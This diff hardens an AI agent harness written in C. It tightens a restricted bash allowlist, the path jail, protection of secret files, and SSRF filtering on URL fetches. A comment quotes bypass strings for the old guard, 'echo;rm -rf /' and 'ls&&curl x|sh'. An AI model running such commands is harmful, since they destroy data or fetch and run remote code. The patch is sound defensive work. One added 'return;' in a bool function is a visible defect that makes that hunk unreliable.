@@ -12,6 +12,9 @@
 #include <fnmatch.h>
 #include <strings.h>
 #include <regex.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <curl/curl.h>
 
 static BelyaHarness *g_harness = NULL;
@@ -115,20 +118,33 @@ static char *tool_bash(BelyaAgent *agent, const JsonValue *args) {
     const char *cmd = json_obj_get_str(args, "command");
     if (!cmd) return strdup("Error: Missing command argument.");
 
-    // Tester Restricted Execution Guard: allow only test and build commands
+    // Tester Restricted Execution Guard: allow only build/test/read/verify targets.
+    // H3 fix: substring/prefix matching was bypassable (e.g. "echo;rm -rf /",
+    // "ls&&curl x|sh", any command containing "make test"). Now: reject shell
+    // metacharacters, then exact-match argv[0] against a read-only allowlist.
     if (g_harness && g_harness->bash_restricted) {
         const char *t = cmd;
         while (*t == ' ' || *t == '\t') t++;
         bool allowed = false;
-        const char *allowed_cmds[] = {
-            "make", "./belya_test", "gcc", "clang", "ctest", "git status", "git diff", "cat ", "ls", "pwd", "echo", NULL
-        };
-        for (int i = 0; allowed_cmds[i]; i++) {
-            if (strncmp(t, allowed_cmds[i], strlen(allowed_cmds[i])) == 0 ||
-                strstr(t, "make test") != NULL ||
-                strstr(t, "./belya_test") != NULL) {
-                allowed = true;
-                break;
+        if (strpbrk(t, ";|&$`\\<>(){}") == NULL && strchr(t, '\n') == NULL) {
+            static const char *allowed_cmds[] = {
+                "make", "./belya_test", "./almaz_test", "gcc", "clang", "ctest",
+                "git", "cat", "ls", "pwd", "echo", "grep", "find", "wc", "diff",
+                "head", "tail", "sort", "uniq", "md5sum", "sha256sum", "file", "stat",
+                NULL
+            };
+            char first[128];
+            size_t n = 0;
+            while (t[n] && !isspace((unsigned char)t[n]) && n < sizeof(first) - 1) {
+                first[n] = t[n];
+                n++;
+            }
+            first[n] = '\0';
+            for (int i = 0; allowed_cmds[i]; i++) {
+                if (strcmp(first, allowed_cmds[i]) == 0) {
+                    allowed = true;
+                    break;
+                }
             }
         }
         if (!allowed) {
@@ -292,6 +308,9 @@ static char *tool_bash(BelyaAgent *agent, const JsonValue *args) {
             dyn_str_append(&out, buf);
             if (out.len > 100000) {
                 dyn_str_append(&out, "\n[Output Truncated by Belya Harness (100KB buffer limit)]");
+                /* H6: reap the child instead of leaking a zombie bypassing timeout. */
+                kill(pid, SIGKILL);
+                waitpid(pid, NULL, 0);
                 break;
             }
         }
@@ -329,17 +348,55 @@ static char *tool_bash(BelyaAgent *agent, const JsonValue *args) {
     return out.data;
 }
 
+static char g_workspace_root[4096];
+static bool g_workspace_root_set = false;
+
+/* Secrets and operator state that file tools must never expose or mutate. */
+static bool is_secret_path(const char *path) {
+    if (!path || path[0] == '\0') return false;
+    const char *base = strrchr(path, '/');
+    base = base ? base + 1 : path;
+    if (strcmp(base, ".env") == 0) return true;
+    if (strcmp(base, "budget_state.txt") == 0) return true;
+    if (strcmp(base, ".deploy_state") == 0) return true;
+    return false;
+}
+
+/* H2: names used to build file paths (custom tools, skills) must be safe
+   single path components: [A-Za-z0-9_-]{1,64}. */
+static bool valid_ident(const char *s) {
+    if (!s) return false;
+    size_t n = 0;
+    for (; *s; s++, n++) {
+        unsigned char c = (unsigned char)*s;
+        if (!(isalnum(c) || c == '_' || c == '-')) return false;
+        if (n >= 64) return false;
+    }
+    return n > 0 && n <= 64;
+}
+
+static bool whitelist_match(const char *resolved, const char *wl) {
+    size_t wlen = strlen(wl);
+    return strncmp(resolved, wl, wlen) == 0 && (resolved[wlen] == '\0' || resolved[wlen] == '/');
+}
+
 bool is_path_jailed(const char *path, const char *workspace_root, bool is_write) {
     if (!path || path[0] == '\0') return false;
 
     // Reject paths with explicit directory traversal
     if (strstr(path, "..") != NULL) return false;
 
+    // Never expose or write secrets/operator state through file tools
+    if (is_secret_path(path)) return false;
+
     // Determine and canonicalize workspace root
     char root_buf[4096];
     char canonical_root[4096];
     if (workspace_root && workspace_root[0] != '\0') {
         strncpy(root_buf, workspace_root, sizeof(root_buf) - 1);
+        root_buf[sizeof(root_buf) - 1] = '\0';
+    } else if (g_workspace_root_set) {
+        strncpy(root_buf, g_workspace_root, sizeof(root_buf) - 1);
         root_buf[sizeof(root_buf) - 1] = '\0';
     } else {
         if (!getcwd(root_buf, sizeof(root_buf))) return false;
@@ -404,14 +461,18 @@ bool is_path_jailed(const char *path, const char *workspace_root, bool is_write)
         static const char *read_whitelist[] = {
             "/tmp/",
             "/private/tmp/",
-            "/proc/",
+            "/proc/self/status",
+            "/proc/self/cmdline",
+            "/proc/cpuinfo",
+            "/proc/meminfo",
+            "/proc/loadavg",
+            "/proc/uptime",
             "/dev/null",
             "/etc/os-release",
             NULL
         };
         for (int i = 0; read_whitelist[i]; i++) {
-            size_t wlen = strlen(read_whitelist[i]);
-            if (strncmp(resolved, read_whitelist[i], wlen) == 0) {
+            if (whitelist_match(resolved, read_whitelist[i])) {
                 return true;
             }
         }
@@ -431,14 +492,18 @@ bool is_path_jailed(const char *path, const char *workspace_root, bool is_write)
     static const char *read_whitelist[] = {
         "/tmp/",
         "/private/tmp/",
-        "/proc/",
+        "/proc/self/status",
+        "/proc/self/cmdline",
+        "/proc/cpuinfo",
+        "/proc/meminfo",
+        "/proc/loadavg",
+        "/proc/uptime",
         "/dev/null",
         "/etc/os-release",
         NULL
     };
     for (int i = 0; read_whitelist[i]; i++) {
-        size_t wlen = strlen(read_whitelist[i]);
-        if (strncmp(path, read_whitelist[i], wlen) == 0) {
+        if (whitelist_match(path, read_whitelist[i])) {
             return true;
         }
     }
@@ -458,6 +523,12 @@ static char *tool_read_file(BelyaAgent *agent, const JsonValue *args) {
 
     double offset_num = json_obj_get_num(args, "offset", 0);
     double limit_num = json_obj_get_num(args, "limit", 0);
+
+    /* Clamp model-controlled line numbers before casting (M5: avoid UB). */
+    if (offset_num < 0) offset_num = 0;
+    if (limit_num < 0) limit_num = 0;
+    if (offset_num > 100000000) offset_num = 100000000;
+    if (limit_num > 1000000) limit_num = 1000000;
 
     FILE *f = fopen(path, "rb");
     if (!f) return strdup("Error: Target file not found or inaccessible.");
@@ -849,6 +920,7 @@ static char *tool_list_dir(BelyaAgent *agent, const JsonValue *args) {
     (void)agent;
     const char *path = json_obj_get_str(args, "path");
     if (!path) path = g_harness ? g_harness->cwd : ".";
+    if (!is_path_jailed(path, NULL, false)) return strdup("Error: Path traversal denied.");
 
     DIR *d = opendir(path);
     if (!d) return strdup("Error: Unable to open directory path.");
@@ -873,7 +945,7 @@ static void search_files_recursive(const char *dir_path, const char *pattern, co
     while ((dir = readdir(d)) != NULL) {
         if (*match_count >= 50) break;
         if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;
-        if (dir->d_name[0] == '.' && strcmp(dir->d_name, ".env") != 0) continue;
+        if (dir->d_name[0] == '.') continue;
         if (strcmp(dir->d_name, "node_modules") == 0 || strcmp(dir->d_name, "build") == 0) continue;
 
         char sub_path[4096];
@@ -936,6 +1008,7 @@ static char *tool_search_files(BelyaAgent *agent, const JsonValue *args) {
     if (!path || strlen(path) == 0) {
         path = g_harness ? g_harness->cwd : ".";
     }
+    if (!is_path_jailed(path, NULL, false)) return strdup("Error: Path traversal denied.");
 
     regex_t reg;
     regex_t *preg = NULL;
@@ -1052,9 +1125,18 @@ static char *tool_spawn_subagent(BelyaAgent *agent, const JsonValue *args) {
     }
 
     ModelGateway *sub_gw = model_gateway_init(agent->gateway->endpoint, agent->gateway->api_key, agent->gateway->model);
+    if (!sub_gw) {
+        dyn_str_free(&sys);
+        return strdup("Error: Out of memory initializing subagent gateway.");
+    }
     sub_gw->streaming = false; // Run silent to avoid stdout collision
 
     BelyaAgent *sub_agent = belya_agent_init(sub_gw, ":memory:", sys.data);
+    if (!sub_agent) {
+        model_gateway_free(sub_gw);
+        dyn_str_free(&sys);
+        return strdup("Error: Out of memory initializing subagent.");
+    }
     dyn_str_free(&sys);
 
     BelyaHarness *saved_harness = g_harness;
@@ -1185,9 +1267,19 @@ char *belya_agency_dispatch_subagent(BelyaHarness *parent_harness, const char *r
 
     // 5. Initialize isolated subagent and bounded harness
     ModelGateway *sub_gw = model_gateway_init(parent_harness->agent->gateway->endpoint, parent_harness->agent->gateway->api_key, model);
+    if (!sub_gw) {
+        if (manifest) belya_agent_manifest_free(manifest);
+        return strdup("Error: Out of memory initializing subagent gateway.");
+    }
     sub_gw->streaming = false; // Run silent to avoid stdout collision
 
     BelyaAgent *sub_agent = belya_agent_init(sub_gw, ":memory:", sys.data);
+    if (!sub_agent) {
+        model_gateway_free(sub_gw);
+        if (manifest) belya_agent_manifest_free(manifest);
+        dyn_str_free(&sys);
+        return strdup("Error: Out of memory initializing subagent.");
+    }
     dyn_str_free(&sys);
 
     BelyaHarness *saved_harness = g_harness;
@@ -1267,18 +1359,22 @@ char *belya_agency_dispatch_subagent(BelyaHarness *parent_harness, const char *r
         subagent_failed = true;
     }
 
-    // 6. Git Rollback Guard Execution
+    // 6. Git Rollback Guard Execution (non-destructive)
+    // C2 fix: never `git reset --hard` or `git clean -fd` — that destroys the
+    // operator's uncommitted and untracked work (state DBs, skills, trajectories).
+    // Restore only tracked files under the subagent's workspace.
     bool rolled_back = false;
     if (has_write && git_repo_available && is_valid_hex_sha(snapshot_sha)) {
         if (subagent_failed) {
-            char reset_cmd[256];
-            snprintf(reset_cmd, sizeof(reset_cmd), "git reset --hard %s 2>/dev/null && git clean -fd 2>/dev/null", snapshot_sha);
+            char reset_cmd[1024];
+            snprintf(reset_cmd, sizeof(reset_cmd),
+                     "git -C \"%s\" checkout -- . 2>/dev/null", parent_harness->cwd);
             int ret = system(reset_cmd);
             (void)ret;
             rolled_back = true;
 
             char log_msg[256];
-            snprintf(log_msg, sizeof(log_msg), "Subagent '%s' failed; rolled back to snapshot %.8s", role_name, snapshot_sha);
+            snprintf(log_msg, sizeof(log_msg), "Subagent '%s' failed; restored tracked files to snapshot %.8s (untracked preserved)", role_name, snapshot_sha);
             belya_agent_log_timeline(parent_harness->agent, "subagent_rollback", log_msg);
         } else {
             char log_msg[256];
@@ -1383,19 +1479,39 @@ bool belya_agency_triage(BelyaHarness *harness, const char *user_input, char ***
     if (is_review && !str_contains_ci(p, "fix") && !str_contains_ci(p, "implement")) {
         count = 1;
         pipeline = malloc(sizeof(char *) * count);
+        if (!pipeline) {
+            *out_pipeline = NULL;
+            *out_count = 0;
+            return false;
+        }
         pipeline[0] = strdup("reviewer");
     } else if (is_test && !str_contains_ci(p, "fix") && !str_contains_ci(p, "implement")) {
         count = 1;
         pipeline = malloc(sizeof(char *) * count);
+        if (!pipeline) {
+            *out_pipeline = NULL;
+            *out_count = 0;
+            return false;
+        }
         pipeline[0] = strdup("tester");
     } else if (is_research && !str_contains_ci(p, "fix") && !str_contains_ci(p, "implement")) {
         count = 1;
         pipeline = malloc(sizeof(char *) * count);
+        if (!pipeline) {
+            *out_pipeline = NULL;
+            *out_count = 0;
+            return false;
+        }
         pipeline[0] = strdup("architect");
     } else {
         // Standard Full Engineering Pipeline: Architect -> Builder -> Tester
         count = 3;
         pipeline = malloc(sizeof(char *) * count);
+        if (!pipeline) {
+            *out_pipeline = NULL;
+            *out_count = 0;
+            return false;
+        }
         pipeline[0] = strdup("architect");
         pipeline[1] = strdup("builder");
         pipeline[2] = strdup("tester");
@@ -1444,6 +1560,49 @@ static size_t fetch_url_curl_sink(void *ptr, size_t size, size_t nmemb, void *us
     DynString *ds = (DynString *)userdata;
     dyn_str_append_len(ds, (const char *)ptr, total);
     return total;
+}
+
+/* SSRF guard: reject loopback, link-local, and RFC1918/documented-private
+   destinations (including IPv4-mapped IPv6). Called per connection attempt. */
+static bool sockaddr_is_private(const struct sockaddr *sa) {
+    if (!sa) return false;
+    if (sa->sa_family == AF_INET) {
+        const struct sockaddr_in *in = (const struct sockaddr_in *)sa;
+        uint32_t a = ntohl(in->sin_addr.s_addr);
+        if ((a & 0xFF000000u) == 0x00000000u) return true;   /* 0.0.0.0/8 */
+        if ((a & 0xFF000000u) == 0x0A000000u) return true;   /* 10.0.0.0/8 */
+        if ((a & 0xFF000000u) == 0x7F000000u) return true;   /* 127.0.0.0/8 */
+        if ((a & 0xFFF00000u) == 0xAC100000u) return true;   /* 172.16.0.0/12 */
+        if ((a & 0xFFFF0000u) == 0xC0A80000u) return true;   /* 192.168.0.0/16 */
+        if ((a & 0xFFFF0000u) == 0xA9FE0000u) return true;   /* 169.254.0.0/16 */
+        return false;
+    }
+    if (sa->sa_family == AF_INET6) {
+        const struct sockaddr_in6 *in6 = (const struct sockaddr_in6 *)sa;
+        const uint8_t *b = in6->sin6_addr.s6_addr;
+        if (IN6_IS_ADDR_LOOPBACK(&in6->sin6_addr)) return true;
+        if (IN6_IS_ADDR_LINKLOCAL(&in6->sin6_addr)) return true;
+        if (IN6_IS_ADDR_SITELOCAL(&in6->sin6_addr)) return true;
+        if ((b[0] & 0xFE) == 0xFC) return true;              /* fc00::/7 ULA */
+        if (IN6_IS_ADDR_V4MAPPED(&in6->sin6_addr)) {         /* ::ffff:a.b.c.d */
+            struct sockaddr_in v4;
+            memset(&v4, 0, sizeof(v4));
+            v4.sin_family = AF_INET;
+            memcpy(&v4.sin_addr, &in6->sin6_addr.s6_addr[12], 4);
+            return sockaddr_is_private((const struct sockaddr *)&v4);
+        }
+        return false;
+    }
+    return false;
+}
+
+static curl_socket_t fetch_url_opensocket_cb(void *clientp, curlsocktype purpose,
+                                             const struct sockaddr *addr, socklen_t addrlen) {
+    (void)clientp; (void)purpose; (void)addrlen;
+    if (addr && sockaddr_is_private(addr)) {
+        return CURL_SOCKET_BAD; /* refuse the connection */
+    }
+    return socket(addr ? addr->sa_family : AF_INET, SOCK_STREAM, 0);
 }
 
 static char *tool_fetch_url(BelyaAgent *agent, const JsonValue *args) {
@@ -1503,6 +1662,14 @@ static char *tool_fetch_url(BelyaAgent *agent, const JsonValue *args) {
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
     curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
+    /* C1: only http/https; block file://, gopher, etc. (and on redirects). */
+    curl_easy_setopt(curl, CURLOPT_PROTOCOLS_STR, "http,https");
+    curl_easy_setopt(curl, CURLOPT_REDIR_PROTOCOLS_STR, "http,https");
+    /* C1: SSRF guard — refuse loopback/link-local/private destinations unless
+       the operator explicitly allows them via FETCH_ALLOW_PRIVATE=1. */
+    if (!getenv("FETCH_ALLOW_PRIVATE")) {
+        curl_easy_setopt(curl, CURLOPT_OPENSOCKETFUNCTION, fetch_url_opensocket_cb);
+    }
 
     CURLcode code = curl_easy_perform(curl);
     long http_code = 0;
@@ -1538,6 +1705,7 @@ static char *tool_save_skill(BelyaAgent *agent, const JsonValue *args) {
     const char *instructions = json_obj_get_str(args, "instructions");
 
     if (!name || !instructions) return strdup("Error: Missing required arguments (name, instructions).");
+    if (!valid_ident(name)) return strdup("Error: Invalid skill name (allowed: A-Za-z0-9_- , max 64 characters).");
     if (belya_agent_save_skill(agent, name, trigger, desc, instructions)) {
         DynString res = dyn_str_new();
         dyn_str_appendf(&res, "Skill '%s' successfully saved to procedural memory with trigger '%s'.", name, trigger ? trigger : name);
@@ -1668,7 +1836,12 @@ static char *tool_custom_script_runner(BelyaAgent *agent, const JsonValue *args)
         if (bytes > 0) {
             buf[bytes] = '\0';
             dyn_str_append(&out, buf);
-            if (out.len > 100000) break;
+            if (out.len > 100000) {
+                /* H6: reap the child instead of leaking a zombie. */
+                kill(pid, SIGKILL);
+                waitpid(pid, NULL, 0);
+                break;
+            }
         }
 
         int status;
@@ -1738,6 +1911,10 @@ bool belya_harness_define_custom_tool(BelyaHarness *h, const char *name, const c
         if (params) json_free(params);
         return false;
     }
+    if (!valid_ident(name)) {
+        if (params) json_free(params);
+        return false;
+    }
 
     mkdir(".belya", 0755);
     mkdir(".belya/tools", 0755);
@@ -1781,7 +1958,11 @@ bool belya_harness_define_custom_tool(BelyaHarness *h, const char *name, const c
     json_free(meta);
 
     // Register into active harness
-    h->tools[h->tool_count].name = strdup(name);
+    char *name_copy2 = strdup(name);
+    if (!name_copy2) {
+        return;
+    }
+    h->tools[h->tool_count].name = name_copy2;
     h->tools[h->tool_count].security = PERM_ALLOW;
     h->tools[h->tool_count].callback = tool_custom_script_runner;
     h->tools[h->tool_count].custom_script_path = strdup(script_path);
@@ -1889,6 +2070,17 @@ BelyaHarness *belya_harness_init_bounded(BelyaAgent *agent, const char *tools_wh
     }
     if (getcwd(h->cwd, sizeof(h->cwd)) == NULL) {
         snprintf(h->cwd, sizeof(h->cwd), ".");
+    }
+    /* Capture the workspace root exactly once, at first harness init.
+       The jail must NOT follow later chdir() calls from tool_bash. */
+    if (!g_workspace_root_set) {
+        char root_tmp[4096];
+        if (getcwd(root_tmp, sizeof(root_tmp))) {
+            if (!realpath(root_tmp, g_workspace_root)) {
+                snprintf(g_workspace_root, sizeof(g_workspace_root), "%s", root_tmp);
+            }
+            g_workspace_root_set = true;
+        }
     }
     g_harness = h;
 
@@ -2212,7 +2404,12 @@ void belya_harness_register_tool(BelyaHarness *h, const char *name, const char *
         if (params) json_free(params);
         return;
     }
-    h->tools[h->tool_count].name = strdup(name);
+    char *name_copy = strdup(name);
+    if (!name_copy) {
+        if (params) json_free(params);
+        return;
+    }
+    h->tools[h->tool_count].name = name_copy;
     h->tools[h->tool_count].security = sec;
     h->tools[h->tool_count].callback = fn;
     h->tools[h->tool_count].mcp_client = NULL;
@@ -2245,7 +2442,9 @@ bool belya_harness_connect_mcp(BelyaHarness *h, const char *server_cmd) {
 
             if (t_name && h->tool_count < 64) {
                 printf("  + \033[1;33m%s\033[0m: %s\n", t_name, t_desc ? t_desc : "");
-                h->tools[h->tool_count].name = strdup(t_name);
+                char *mcp_name = strdup(t_name);
+                if (!mcp_name) continue;
+                h->tools[h->tool_count].name = mcp_name;
                 h->tools[h->tool_count].security = PERM_ALLOW;
                 h->tools[h->tool_count].callback = NULL;
                 h->tools[h->tool_count].custom_script_path = NULL;
